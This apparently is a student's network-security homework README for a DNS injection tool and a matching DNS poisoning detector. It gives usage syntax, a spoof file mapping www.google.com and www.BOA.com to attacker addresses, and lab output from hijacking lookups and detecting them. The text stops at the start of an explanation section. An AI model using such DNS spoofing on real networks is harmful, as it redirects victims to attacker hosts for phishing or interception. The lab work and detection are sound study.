NAME    : Bharath Kumar Reddy Vangoor
SBU ID  : 110168461
Home Work 4 (3 extra days Used)

Submission contains following files :

1. Makefile	: File containing the rules to compile and generate the dnsinject and dnsdetect
2. dnsinject.c	: File containing the code for DNS Packet Injecting
3. dnsdetect.c	: File containing the code for DNS Packet Detecting
4. spoof.txt	: File containing list of IP address and hostname pairs to be hijacked
5. capture.pcap	: pcap file containing traffic taken containg some spoofed DNS packets, used for dnsdetect offline mode.

Instructions to run :

1. Compile :
	bharath@ubuntu:~/Network-Security/HomeWork4$ make
	gcc dnsinject.c -lpcap -o dnsinject
	gcc dnsdetect.c -lpcap -o dnsdetect

2. How to run :
	DNS Injection :
	bharath@ubuntu:~/Network-Security/HomeWork4$ ./dnsinject -h
	./dnsinject [-i interface] [-f file] expression
	-i  Listen on network device <interface> (e.g., eth0).
	-f  File with Ip addresses and Hostnames to be Hijacked
	<expression> is a BPF filter that specifies which packets will be monitored.
	
	DNS Detection :
	bharath@ubuntu:~/Network-Security/HomeWork4$ ./dnsdetect -h
	./dnsdetect [-i interface] [-r file] expression
	-i  Listen on network device <interface> (e.g., eth0).
	-r  Read packets from <file> (eg. ex.pcap) (tcpdump format).
	<expression> is a BPF filter that specifies which packets will be dumped.

3. Run (Examples) :
	 a) Hijacking "www.google.com" with IP address from "spoof.txt"
		Spoof file contents (Attacker Machine):
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# cat spoof.txt 
		192.168.0.17	www.BOA.com
		192.168.186.12	www.google.com
		....

		DNS Inject Output (Attacker Machine) :
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# ./dnsinject -i ens33 -f spoof.txt 
		Query Name : www.google.com
		SuccessFully sent Answer : 192.168.186.12 (76)

		NS Lookup Output (Victim Machine) :
		bharath@ubuntu:~$ nslookup www.google.com
		Server:		127.0.1.1
		Address:	127.0.1.1#53

		Non-authoritative answer:
		Name:	www.google.com
		Address: 192.168.186.12

		DNS Detection Output (Victim Machine) :
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# ./dnsdetect -i ens33
		2016-05-09 13:28:18.423615 DNS poisoning attempt
		TXID 0x4873 Request www.google.com
		Answer1 [192.168.186.12, ]
		Answer2 [209.85.232.103, 209.85.232.99, 209.85.232.105, 209.85.232.106, 209.85.232.147, 209.85.232.104, ]

	b) Hijacking "www.google.com" with IP address of the Attacker Machine (No spoof.txt file)
		IP of Attacker Machine :
		bharath@ubuntu:~/Network-Security/HomeWork4$ ifconfig
		ens33     Link encap:Ethernet  HWaddr 00:0c:29:fa:f7:d5  
		inet addr:192.168.186.132  Bcast:192.168.186.255  Mask:255.255.255.0

		DNS Inject Output (Attacker Machine) :
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# ./dnsinject -i ens33
		Query Name : www.google.com
		SuccessFully sent Answer : 192.168.186.132 (76)

		NS Lookup Output (Victim Machine) :
		bharath@ubuntu:~$ nslookup www.google.com
		Server:		127.0.1.1
		Address:	127.0.1.1#53

		Non-authoritative answer:
		Name:	www.google.com
		Address: 192.168.186.132

		DNS Detection Output (Victim Machine) :
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# ./dnsdetect -i ens33
		2016-05-09 13:34:56.869630 DNS poisoning attempt
		TXID 0x9091 Request www.google.com
		Answer1 [192.168.186.132, ]
		Answer2 [209.85.232.147, 209.85.232.106, 209.85.232.104, 209.85.232.103, 209.85.232.99, 209.85.232.105, ]

	c) Dns Detection with pcap file containing spoofed responses
		root@ubuntu:/home/bharath/Network-Security/HomeWork4# ./dnsdetect -r capture.pcap 
		2016-05-08 13:23:25.177821 DNS poisoning attempt
		TXID 0xd5f8 Request www.google.com
		Answer1 [192.168.186.132, ]
		Answer2 [173.194.204.103, 173.194.204.106, 173.194.204.99, 173.194.204.105, 173.194.204.104, 173.194.204.147, ]

		2016-05-08 13:23:42.165380 DNS poisoning attempt
		TXID 0x126f Request www.BOA.com
		Answer1 [192.168.0.17, ]
		Answer2 [50.62.168.154, ]

		2016-05-08 13:24:15.228624 DNS poisoning attempt
		TXID 0x37ea Request www.fsl1.com
		Answer1 [127.0.0.2, ]
		Answer2 [173.201.93.128, ]

		2016-05-08 13:25:00.574641 DNS poisoning attempt
		TXID 0xb1ff Request www.cs.stonybrook.edu
		Answer1 [192.168.66.6, ]
		Answer2 [130.245.27.2, ]

Explaination :

1. Setup :
	a) Used VMWARE   
